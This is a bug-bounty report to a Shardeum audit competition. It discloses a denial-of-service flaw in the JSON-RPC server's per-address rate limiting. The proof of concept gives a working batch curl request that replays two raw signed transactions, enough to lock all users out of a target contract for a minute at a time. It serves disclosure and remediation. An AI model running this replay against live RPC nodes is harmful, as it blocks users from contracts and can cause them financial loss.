# #39820 \[W\&A-Medium] Blocking all users from interacting with particular contracts/protocols via JSON

**Submitted on Feb 8th 2025 at 09:55:13 UTC by @anton\_quantish for** [**Audit Comp | Shardeum: Ancillaries III**](https://immunefi.com/audit-competition/audit-comp-shardeum-ancillaries-iii)

* **Report ID:** #39820
* **Report Type:** Websites and Applications
* **Report severity:** Medium
* **Target:** <https://github.com/shardeum/json-rpc-server/tree/itn4>
* **Impacts:**
  * RPC API crash affecting projects with greater than or equal to 25% of the market capitalization on top of the respective layer

## Description

## Brief/Intro

I found a way to prevent all the JSON-RPC users from interacting with particular contracts/protocols.

## Vulnerability Details

Every JSON-RPC method call passes through the `rateLimitMiddleware` which, in turn, passes them through `utils.ts:isRequestOkay` checking method.

If the method called is 'eth\_sendRawTransaction', the transaction object restores from the raw tx hash and, among the other checks, the `to` address requests history is checked:\
<https://github.com/shardeum/json-rpc-server/blob/aba70af9ae65b59034c87ced1253a7478a2a0293/src/utils.ts#L1114-L1142>

```js
if (config.rateLimit && config.rateLimitOption.limitToAddress) {
          const toAddressHistory = this.heavyAddresses.get(readableTx.to)
          if (toAddressHistory && toAddressHistory.length >= 10) {
            if (now - toAddressHistory[toAddressHistory.length - 10] < oneMinute) {
              this.addAbusedAddress(readableTx.to, readableTx.from as string, ip)
              // ... verbose logging ...
              // ... faucet check ...
              // ... tx status saving ...
              return false
            }
          }
        }
```

As you can see, if there are more than 10 transactions **to** the `to` address within the last minute, the `isRequestOkay` function returns `false`, so the incoming transaction is rejected.

This check allows an attacker to block all the JSON-RPC users from interacting with particular contracts/protocols by just periodically sending any (even incorrect) transactions to these contracts.

## Impact Details

I believe it pretty falls under the `RPC API crash affecting projects with greater than or equal to 25% of the market capitalization on top of the respective layer` impact.

Despite there's no exact JSON-RPC crash, it stops processing transactions to particular protocols/contracts from any user, that can affect lots of top-tier protocols (and even the whole Shardeum blockchain if any service contracts exist).

The attack can totally block all the JSON-RPC users from:

* interacting with any top tokens (that could lead to losing funds because of price fluctuations);
* updating oracle contracts data (that could lead to incorrect working of multiple protocols relying to oracles);
* interacting with Shardeum service contracts (that could disrupt the entire blockchain functionality).

## Proof of Concept

For instance, the attacker wants to block the JSON-RPC users from interacting with contract `0xcB059C5573646047D6d88dDdb87B745C18161d3b`.

All he needs is to take 2 different transactions to this contract from the Shardeum explorer. They could be old, or they could be newer than the current block number (from a different chain), and from any user – it doesn’t matter. For instance:

```
0xf8ab7484b2d05e0083017b0694cb059c5573646047d6d88dddb87b745c18161d3b80b844a9059cbb000000000000000000000000d92bfb959ebaf6febea3a53e80bb345afa7ce794000000000000000000000000000000000000000000000002f8603c262f2d16aa820136a0c0c60c0b0460f4f19017eb4c903a66c0a83624c4dc1665e980b14062fd3b7e36a037f7815e1f37e90b49d2f8e3b86bfae15ca097801f647598a58f6bff9b9bb59f

0xf88a018506fc23ac0082b7a694cb059c5573646047d6d88dddb87b745c18161d3b80a42e1a7d4d00000000000000000000000000000000000000000000013ad4f3e9c6bf209800820135a0e4219b0b051f2016fa7657ead333f56e5cbbb3cd61346fa65fe5443b6b137781a063de6ac3975203e94b61d1a90e2c183c006942800106e61ced5fbf0ffe212211
```

Then he sends the following batch JSON-RPC request:

```bash
curl http://127.0.0.1:8080 -XPOST --data '[{"jsonrpc":"2.0","method":"eth_sendRawTransaction","params":["0xf8ab7484b2d05e0083017b0694cb059c5573646047d6d88dddb87b745c18161d3b80b844a9059cbb000000000000000000000000d92bfb959ebaf6febea3a53e80bb345afa7ce794000000000000000000000000000000000000000000000002f8603c262f2d16aa820136a0c0c60c0b0460f4f19017eb4c903a66c0a83624c4dc1665e980b14062fd3b7e36a037f7815e1f37e90b49d2f8e3b86bfae15ca097801f647598a58f6bff9b9bb59f"],"id":1},{"jsonrpc":"2.0","method":"eth_sendRawTransaction","params":["0xf88a018506fc23ac0082b7a694cb059c5573646047d6d88dddb87b745c18161d3b80a42e1a7d4d00000000000000000000000000000000000000000000013ad4f3e9c6bf209800820135a0e4219b0b051f2016fa7657ead333f56e5cbbb3cd61346fa65fe5443b6b137781a063de6ac3975203e94b61d1a90e2c183c006942800106e61ced5fbf0ffe212211"],"id":1},{"jsonrpc":"2.0","method":"eth_sendRawTransaction","params":["0xf8ab7484b2d05e0083017b0694cb059c5573646047d6d88dddb87b745c18161d3b80b844a9059cbb000000000000000000000000d92bfb959ebaf6febea3a53e80bb345afa7ce794000000000000000000000000000000000000000000000002f8603c262f2d16aa820136a0c0c60c0b0460f4f19017eb4c903a66c0a83624c4dc1665e980b14062fd3b7e36a037f7815e1f37e90b49d2f8e3b86bfae15ca097801f647598a58f6bff9b9bb59f"],"id":1},{"jsonrpc":"2.0","method":"eth_sendRawTransaction","params":["0xf88a018506fc23ac0082b7a694cb059c5573646047d6d88dddb87b745c18161d3b80a42e1a7d4d00000000000000000000000000000000000000000000013ad4f3e9c6bf209800820135a0e4219b0b051f2016fa7657ead333f56e5cbbb3cd61346fa65fe5443b6b137781a063de6ac3975203e94b61d1a90e2c183c006942800106e61ced5fbf0ffe212211"],"id":1},{"jsonrpc":"2.0","method":"eth_sendRawTransaction","params":["0xf8ab7484b2d05e0083017b0694cb059c5573646047d6d88dddb87b745c18161d3b80b844a9059cbb000000000000000000000000d92bfb959ebaf6febea3a53e80bb345afa7ce794000000000000000000000000000000000000000000000002f8603c262f2d16aa820136a0c0c60c0b0460f4f19017eb4c903a66c0a83624c4dc1665e980b14062fd3b7e36a037f7815e1f37e90b49d2f8e3b86bfae15ca097801f647598a58f6bff9b9bb59f"],"id":1},{"jsonrpc":"2.0","method":"eth_sendRawTransaction","params":["0xf88a018506fc23ac0082b7a694cb059c5573646047d6d88dddb87b745c18161d3b80a42e1a7d4d00000000000000000000000000000000000000000000013ad4f3e9c6bf209800820135a0e4219b0b051f2016fa7657ead333f56e5cbbb3cd61346fa65fe5443b6b137781a063de6ac3975203e94b61d1a90e2c183c006942800106e61ced5fbf0ffe212211"],"id":1},{"jsonrpc":"2.0","method":"eth_sendRawTransaction","params":["0xf8ab7484b2d05e0083017b0694cb059c5573646047d6d88dddb87b745c18161d3b80b844a9059cbb000000000000000000000000d92bfb959ebaf6febea3a53e80bb345afa7ce794000000000000000000000000000000000000000000000002f8603c262f2d16aa820136a0c0c60c0b0460f4f19017eb4c903a66c0a83624c4dc1665e980b14062fd3b7e36a037f7815e1f37e90b49d2f8e3b86bfae15ca097801f647598a58f6bff9b9bb59f"],"id":1},{"jsonrpc":"2.0","method":"eth_sendRawTransaction","params":["0xf88a018506fc23ac0082b7a694cb059c5573646047d6d88dddb87b745c18161d3b80a42e1a7d4d00000000000000000000000000000000000000000000013ad4f3e9c6bf209800820135a0e4219b0b051f2016fa7657ead333f56e5cbbb3cd61346fa65fe5443b6b137781a063de6ac3975203e94b61d1a90e2c183c006942800106e61ced5fbf0ffe212211"],"id":1},{"jsonrpc":"2.0","method":"eth_sendRawTransaction","params":["0xf8ab7484b2d05e0083017b0694cb059c5573646047d6d88dddb87b745c18161d3b80b844a9059cbb000000000000000000000000d92bfb959ebaf6febea3a53e80bb345afa7ce794000000000000000000000000000000000000000000000002f8603c262f2d16aa820136a0c0c60c0b0460f4f19017eb4c903a66c0a83624c4dc1665e980b14062fd3b7e36a037f7815e1f37e90b49d2f8e3b86bfae15ca097801f647598a58f6bff9b9bb59f"],"id":1},{"jsonrpc":"2.0","method":"eth_sendRawTransaction","params":["0xf88a018506fc23ac0082b7a694cb059c5573646047d6d88dddb87b745c18161d3b80a42e1a7d4d00000000000000000000000000000000000000000000013ad4f3e9c6bf209800820135a0e4219b0b051f2016fa7657ead333f56e5cbbb3cd61346fa65fe5443b6b137781a063de6ac3975203e94b61d1a90e2c183c006942800106e61ced5fbf0ffe212211"],"id":1},{"jsonrpc":"2.0","method":"eth_sendRawTransaction","params":["0xf8ab7484b2d05e0083017b0694cb059c5573646047d6d88dddb87b745c18161d3b80b844a9059cbb000000000000000000000000d92bfb959ebaf6febea3a53e80bb345afa7ce794000000000000000000000000000000000000000000000002f8603c262f2d16aa820136a0c0c60c0b0460f4f19017eb4c903a66c0a83624c4dc1665e980b14062fd3b7e36a037f7815e1f37e90b49d2f8e3b86bfae15ca097801f647598a58f6bff9b9bb59f"],"id":1}]' -H 'Content-Type: application/json'
```

It contains these 2 transactions repeated for 5 times.

You will see the following in the JSON-RPC server logs:

> Last tx TO this contract address 0xcb059c5573646047d6d88dddb87b745c18161d3b is less than 60s ago

Then, the other (legitimate) user attempts to send his own transaction to this contract:

```bash
curl http://127.0.0.1:8080 -XPOST --data '{"jsonrpc":"2.0","method":"eth_sendRawTransaction","params":["0xf8ab06850342770c0082fcaf94cb059c5573646047d6d88dddb87b745c18161d3b80b844a9059cbb000000000000000000000000a6eebc3ff4755a59528f84812967d4ba51942078000000000000000000000000000000000000000000000002ff7886959c1ec1ae820135a0217d6b52a02f45f7007cd803057075bc309ccc5f41dae231ffc3cc60f7eb5161a03d406bca8d5d46795616694f8a42b68b3e27af994888b99837f41b917fdc6c65"],"id":1}' -H 'Content-Type: application/json'
```

You will see it's rejected:

> Network is currently busy. Please try again later.

Thus, nobody can interact with this contract for the next minute. The attacker can repeat their malicious request once every minute, permanently blocking this contract from being interacted with by any user.
